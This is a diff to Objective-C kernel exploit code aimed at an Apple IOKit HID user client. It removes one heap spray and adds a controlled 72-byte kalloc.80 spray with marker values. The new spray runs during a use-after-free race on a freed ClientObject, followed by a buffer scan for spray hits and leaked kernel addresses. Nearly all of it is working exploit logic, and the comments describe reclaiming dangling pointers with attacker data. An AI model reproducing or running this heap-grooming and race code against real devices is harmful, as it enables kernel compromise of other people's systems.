@@ -3491,41 +3491,16 @@ static const char kOpenPropertiesGarbage[] =
     uint32_t drainCloseErrs = 0, drainOpenErrs = 0;
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning: %d close/reopen cycles across %d connections (ClientObject zone)...",
                      kMagazineDrainCycles, connCount]];
-    // ClientObject is ~72 bytes → kalloc.80 zone. IOSurfaceCreate allocates
-    // KB-sized objects in a different zone — useless for reclaiming freed
-    // ClientObject slots. Use temporary IOHIDEventService connections instead:
-    // each IOServiceOpen allocates a ClientObject from kalloc.80, filling the
-    // free list so dangling UAF pointers land on valid vtables, not free poison.
+    // Simple close/reopen cycles to pre-condition the kalloc.80 freelist.
+    // The REAL spray (with controlled data) happens inside the churn threads
+    // during the UAF window — that's where it matters.
     for (int i = 0; i < kMagazineDrainCycles; i++) {
-        // Close all — ClientObjects freed to kalloc.80 zone
         for (int c = 0; c < connCount; c++) {
             uint64_t closeScalar = 0;
             kern_return_t ckr = sIOConnectCallMethod(connections[c], kSelectorClose,
                                  &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
             if (ckr != KERN_SUCCESS) drainCloseErrs++;
         }
-
-        // Spray kalloc.80: temp connections whose ClientObjects fill freed slots
-        int tmpCount = 0;
-        for (int s = 0; s < 200 && tmpCount < 250; s++) {
-            io_service_t ts = sIOServiceGetMatchingService(0,
-                sIOServiceMatching("IOHIDEventService"));
-            if (ts == MACH_PORT_NULL) continue;
-            io_connect_t tc = MACH_PORT_NULL;
-            if (sIOServiceOpen(ts, mach_task_self(), 2, &tc) == KERN_SUCCESS && tc != MACH_PORT_NULL) {
-                // Gate the temp conn: writes provider state, anchors ClientObject in kalloc.80
-                uint64_t ts0 = 0;
-                sIOConnectCallMethod(tc, kSelectorOpen, &ts0, 1,
-                    kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
-                    NULL, NULL, NULL, NULL);
-                sIOServiceClose(tc); // tear down — but slot was filled with valid vtable
-                tmpCount++;
-            }
-            sIOObjectRelease(ts);
-        }
-        [self appendLog:[NSString stringWithFormat:@"  Drain[%d]: %d temp conns sprayed kalloc.80", i, tmpCount]];
-
-        // Reopen main connections — remaining freed slots get fresh ClientObjects
         for (int c = connCount - 1; c >= 0; c--) {
             uint64_t openScalar = 0;
             const char *xml = kOpenPropertiesXML;
@@ -3655,6 +3630,25 @@ static const char kOpenPropertiesGarbage[] =
                 atomic_fetch_add(&lifecycleCloseErrors, 1);
             }
 
+            // SPRAY: reclaim freed ClientObject slot with controlled data.
+            // Same kalloc.80 spray as churn threads — widens the race window.
+            static uint8_t lcSprayBuf[72] = {0};
+            static dispatch_once_t lcSprayInit;
+            dispatch_once(&lcSprayInit, ^{
+                memset(lcSprayBuf, 0x41, 72);
+                *(uint64_t *)(lcSprayBuf + 0)  = 0xFEEDC0DEDEADBEEFULL;
+                *(uint64_t *)(lcSprayBuf + 8)  = 0xCAFEBABEDEADBEEFULL;
+                *(uint64_t *)(lcSprayBuf + 16) = 0xBADC0FFEE0DDF00DULL;
+                *(uint64_t *)(lcSprayBuf + 24) = 0x4141414141414141ULL;
+                *(uint64_t *)(lcSprayBuf + 32) = 0x4242424242424242ULL;
+            });
+            for (int sp = 0; sp < 4; sp++) {
+                uint64_t spScalar = 0;
+                sIOConnectCallMethod(connections[0], kSelectorOpen,
+                    &spScalar, 1, (const char *)lcSprayBuf, 72,
+                    NULL, NULL, NULL, NULL);
+            }
+
             // Re-open with valid XML — allocates a NEW ClientObject from the same zone.
             // If the zone's free list contains a slot from a different connection's
             // released ClientObject, this allocation may reuse that slot.
@@ -3701,6 +3695,31 @@ static const char kOpenPropertiesGarbage[] =
                                                           &closeScalar, 1, NULL, 0,
                                                           NULL, NULL, NULL, NULL);
                 if (ckr != KERN_SUCCESS) localCloseErrs++;
+
+                // === SPRAY: reclaim freed ClientObject slot (kalloc.80) ===
+                // After close, ClientObject is freed. IOConnectCallMethod with
+                // 72-byte struct input copies data to kalloc.80 — first copy
+                // reclaims the just-freed slot. A concurrent reader copyEvent
+                // (selector 2, un-gated) may dereference the dangling pointer
+                // and read our spray data as the ClientObject, causing event
+                // data to be written to our controlled buffer address.
+                // Repeat 4x to widen the race window (~400us total).
+                static uint8_t sprayBuf[72] = {0};
+                static dispatch_once_t sprayInit;
+                dispatch_once(&sprayInit, ^{
+                    memset(sprayBuf, 0x41, 72);
+                    *(uint64_t *)(sprayBuf + 0)  = 0xFEEDC0DEDEADBEEFULL;
+                    *(uint64_t *)(sprayBuf + 8)  = 0xCAFEBABEDEADBEEFULL;
+                    *(uint64_t *)(sprayBuf + 16) = 0xBADC0FFEE0DDF00DULL;
+                    *(uint64_t *)(sprayBuf + 24) = 0x4141414141414141ULL;
+                    *(uint64_t *)(sprayBuf + 32) = 0x4242424242424242ULL;
+                });
+                for (int sp = 0; sp < 4; sp++) {
+                    uint64_t spScalar = 0;
+                    sIOConnectCallMethod(churnConn, kSelectorOpen,
+                        &spScalar, 1, (const char *)sprayBuf, 72,
+                        NULL, NULL, NULL, NULL);
+                }
 
                 // Open — re-establish the connection state after close.
                 uint64_t openScalar = 0;
@@ -3976,6 +3995,40 @@ static const char kOpenPropertiesGarbage[] =
         [self appendLog:[NSString stringWithFormat:@"  No kernel addrs in %d buffers (full dump saved)", kMaxAux]];
     } else {
         [self appendLog:[NSString stringWithFormat:@"  Found %d kernel addresses", kleakFound]];
+    }
+
+    // ---- Scan buffers for spray markers (confirms kalloc.80 reclaim) ----
+    {
+        static const uint64_t sprayMarkers[] = {
+            0xFEEDC0DEDEADBEEFULL, 0xCAFEBABEDEADBEEFULL,
+            0xBADC0FFEE0DDF00DULL, 0x4141414141414141ULL, 0x4242424242424242ULL
+        };
+        int sprayHits = 0;
+        for (int bi = 0; bi < kMaxAux && sprayHits < 10; bi++) {
+            mach_vm_address_t bufAddr = (bi == 0) ? mappedAddr : (bi < kMaxAux ? auxMappedAddrs[bi] : 0);
+            mach_vm_size_t bufSize = (bi == 0) ? mappedSize : (bi < kMaxAux ? auxMappedSizes[bi] : 0);
+            if (bufAddr == 0 || bufSize < 8) continue;
+            const uint8_t *buf = (const uint8_t *)(uintptr_t)bufAddr;
+            int scanLen = (int)MIN(bufSize, 4096);
+            for (int off = 0; off + 8 <= scanLen; off += 8) {
+                uint64_t val = 0;
+                memcpy(&val, buf + off, sizeof(val));
+                for (int m = 0; m < 5; m++) {
+                    if (val == sprayMarkers[m]) {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  *** SPRAY HIT: marker[%d]=0x%016llx in buf[%d]+0x%x ***", m, val, bi, off]];
+                        sprayHits++;
+                        if (sprayHits >= 10) break;
+                    }
+                }
+                if (sprayHits >= 10) break;
+            }
+        }
+        if (sprayHits == 0) {
+            [self appendLog:@"  No spray markers found in buffers — spray may not have reclaimed target slot"];
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"  *** %d spray markers found — kalloc.80 spray confirmed ***", sprayHits]];
+        }
     }
 
     // ---- Release multi-conn client slots FIRST (free provider for probe) ----
